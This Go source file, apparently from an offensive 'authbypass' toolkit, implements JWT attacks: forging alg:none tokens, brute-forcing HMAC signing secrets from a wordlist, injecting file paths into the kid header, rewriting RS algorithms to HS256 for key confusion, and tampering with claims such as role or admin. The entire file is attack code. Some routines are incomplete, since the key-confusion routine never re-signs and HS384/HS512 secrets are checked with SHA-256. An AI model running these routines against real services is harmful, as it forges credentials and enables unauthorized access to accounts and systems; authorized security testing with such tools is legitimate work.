package authbypass

import (
	"crypto/hmac"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
	"time"
)

type JWTModule struct{}

func NewJWTModule() *JWTModule {
	return &JWTModule{}
}

func (j *JWTModule) JWTNoneAttack(token string) (*BypassResult, error) {
	start := time.Now()

	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return &BypassResult{
			Success:   false,
			Method:    MethodJWTBypass,
			Error:     "invalid JWT format",
			Timestamp: time.Now(),
			Duration:  time.Since(start),
		}, fmt.Errorf("invalid JWT format: expected 3 parts, got %d", len(parts))
	}

	headerBytes, err := base64URLDecode(parts[0])
	if err != nil {
		return &BypassResult{
			Success:   false,
			Method:    MethodJWTBypass,
			Error:     fmt.Sprintf("failed to decode header: %v", err),
			Timestamp: time.Now(),
			Duration:  time.Since(start),
		}, err
	}

	var header map[string]interface{}
	if err := json.Unmarshal(headerBytes, &header); err != nil {
		return &BypassResult{
			Success:   false,
			Method:    MethodJWTBypass,
			Error:     fmt.Sprintf("failed to parse header JSON: %v", err),
			Timestamp: time.Now(),
			Duration:  time.Since(start),
		}, err
	}

	header["alg"] = "none"

	modifiedHeader, _ := json.Marshal(header)
	encodedHeader := base64URLEncode(modifiedHeader)

	tamperedToken := encodedHeader + "." + parts[1] + "."

	return &BypassResult{
		Success: true,
		Method:  MethodJWTBypass,
		Details: "JWT alg:none bypass crafted. Token has no signature verification.",
		Data: map[string]string{
			"original_token":  token,
			"tampered_token":  tamperedToken,
			"attack_type":     "alg_none",
		},
		Timestamp: time.Now(),
		Duration:  time.Since(start),
	}, nil
}

func (j *JWTModule) JWTWeakSecret(token string, wordlist []string) (*BypassResult, error) {
	start := time.Now()

	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return &BypassResult{
			Success:   false,
			Method:    MethodJWTBypass,
			Error:     "invalid JWT format",
			Timestamp: time.Now(),
			Duration:  time.Since(start),
		}, fmt.Errorf("invalid JWT format")
	}

	headerBytes, err := base64URLDecode(parts[0])
	if err != nil {
		return nil, err
	}

	var header map[string]interface{}
	if err := json.Unmarshal(headerBytes, &header); err != nil {
		return nil, err
	}

	alg, _ := header["alg"].(string)
	if alg != "HS256" && alg != "HS384" && alg != "HS512" {
		return &BypassResult{
			Success:   false,
			Method:    MethodJWTBypass,
			Error:     fmt.Sprintf("algorithm %s is not HMAC-based", alg),
			Timestamp: time.Now(),
			Duration:  time.Since(start),
		}, fmt.Errorf("algorithm %s is not HMAC-based", alg)
	}

	signingInput := parts[0] + "." + parts[1]
	expectedSig, err := base64URLDecode(parts[2])
	if err != nil {
		return nil, err
	}

	for i, secret := range wordlist {
		sig := computeHMACSign(signingInput, secret)
		if hmac.Equal(sig, expectedSig) {
			return &BypassResult{
				Success: true,
				Method:  MethodJWTBypass,
				Details: fmt.Sprintf("Weak secret found at position %d", i),
				Data: map[string]string{
					"secret": secret,
					"alg":    alg,
				},
				Timestamp: time.Now(),
				Duration:  time.Since(start),
			}, nil
		}
	}

	return &BypassResult{
		Success:   false,
		Method:    MethodJWTBypass,
		Error:     "no matching secret found in wordlist",
		Timestamp: time.Now(),
		Duration:  time.Since(start),
	}, fmt.Errorf("no matching secret found after %d attempts", len(wordlist))
}

func (j *JWTModule) JWTKidInjection(token string, lfiPath string) (*BypassResult, error) {
	start := time.Now()

	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return &BypassResult{
			Success:   false,
			Method:    MethodJWTBypass,
			Error:     "invalid JWT format",
			Timestamp: time.Now(),
			Duration:  time.Since(start),
		}, fmt.Errorf("invalid JWT format")
	}

	headerBytes, err := base64URLDecode(parts[0])
	if err != nil {
		return nil, err
	}

	var header map[string]interface{}
	if err := json.Unmarshal(headerBytes, &header); err != nil {
		return nil, err
	}

	originalKID, _ := header["kid"].(string)

	header["kid"] = lfiPath

	modifiedHeader, _ := json.Marshal(header)
	encodedHeader := base64URLEncode(modifiedHeader)

	tamperedToken := encodedHeader + "." + parts[1] + "." + parts[2]

	return &BypassResult{
		Success: true,
		Method:  MethodJWTBypass,
		Details: fmt.Sprintf("KID parameter injection: %s -> %s", originalKID, lfiPath),
		Data: map[string]string{
			"original_kid":   originalKID,
			"injected_kid":   lfiPath,
			"tampered_token":  tamperedToken,
			"attack_type":     "kid_injection",
		},
		Timestamp: time.Now(),
		Duration:  time.Since(start),
	}, nil
}

func (j *JWTModule) JWTKeyConfusion(token string) (*BypassResult, error) {
	start := time.Now()

	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return &BypassResult{
			Success:   false,
			Method:    MethodJWTBypass,
			Error:     "invalid JWT format",
			Timestamp: time.Now(),
			Duration:  time.Since(start),
		}, fmt.Errorf("invalid JWT format")
	}

	headerBytes, err := base64URLDecode(parts[0])
	if err != nil {
		return nil, err
	}

	var header map[string]interface{}
	if err := json.Unmarshal(headerBytes, &header); err != nil {
		return nil, err
	}

	originalAlg, _ := header["alg"].(string)

	header["alg"] = "HS256"

	modifiedHeader, _ := json.Marshal(header)
	encodedHeader := base64URLEncode(modifiedHeader)

	tamperedToken := encodedHeader + "." + parts[1] + "." + parts[2]

	return &BypassResult{
		Success: true,
		Method:  MethodJWTBypass,
		Details: fmt.Sprintf("Key confusion attack: %s -> HS256 (using public key as HMAC secret)", originalAlg),
		Data: map[string]string{
			"original_alg":   originalAlg,
			"tampered_alg":   "HS256",
			"tampered_token":  tamperedToken,
			"attack_type":     "key_confusion",
		},
		Timestamp: time.Now(),
		Duration:  time.Since(start),
	}, nil
}

func (j *JWTModule) JWTClaimTamper(token string, claims map[string]interface{}) (string, error) {
	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return "", fmt.Errorf("invalid JWT format")
	}

	payloadBytes, err := base64URLDecode(parts[1])
	if err != nil {
		return "", fmt.Errorf("failed to decode payload: %w", err)
	}

	var payload map[string]interface{}
	if err := json.Unmarshal(payloadBytes, &payload); err != nil {
		return "", fmt.Errorf("failed to parse payload JSON: %w", err)
	}

	for key, value := range claims {
		payload[key] = value
	}

	modifiedPayload, _ := json.Marshal(payload)
	encodedPayload := base64URLEncode(modifiedPayload)

	tamperedToken := parts[0] + "." + encodedPayload + "." + parts[2]

	return tamperedToken, nil
}

func (j *JWTModule) JWTSessionHijack(token string) (*BypassResult, error) {
	start := time.Now()

	parts := strings.Split(token, ".")
	if len(parts) != 3 {
		return &BypassResult{
			Success:   false,
			Method:    MethodJWTBypass,
			Error:     "invalid JWT format",
			Timestamp: time.Now(),
			Duration:  time.Since(start),
		}, fmt.Errorf("invalid JWT format")
	}

	payloadBytes, err := base64URLDecode(parts[1])
	if err != nil {
		return nil, err
	}

	var payload map[string]interface{}
	if err := json.Unmarshal(payloadBytes, &payload); err != nil {
		return nil, err
	}

	exp, hasExp := payload["exp"].(float64)
	if hasExp {
		expiresAt := time.Unix(int64(exp), 0)
		if time.Now().After(expiresAt) {
			return &BypassResult{
				Success:   false,
				Method:    MethodJWTBypass,
				Error:     "token is expired",
				Timestamp: time.Now(),
				Duration:  time.Since(start),
			}, fmt.Errorf("token is expired")
		}
	}

	sub, _ := payload["sub"].(string)
	role, _ := payload["role"].(string)
	admin, _ := payload["admin"].(bool)

	return &BypassResult{
		Success: true,
		Method:  MethodJWTBypass,
		Details: "Session hijack analysis complete",
		Data: map[string]string{
			"subject":    sub,
			"role":       role,
			"admin":      fmt.Sprintf("%v", admin),
			"has_exp":    fmt.Sprintf("%v", hasExp),
			"token":      token,
			"attack_type": "session_hijack",
		},
		Timestamp: time.Now(),
		Duration:  time.Since(start),
	}, nil
}

func base64URLEncode(data []byte) string {
	return strings.TrimRight(base64.URLEncoding.EncodeToString(data), "=")
}

func base64URLDecode(s string) ([]byte, error) {
	switch len(s) % 4 {
	case 2:
		s += "=="
	case 3:
		s += "="
	}
	return base64.URLEncoding.DecodeString(s)
}

func computeHMACSign(signingInput, secret string) []byte {
	mac := hmac.New(sha256.New, []byte(secret))
	mac.Write([]byte(signingInput))
	return mac.Sum(nil)
}
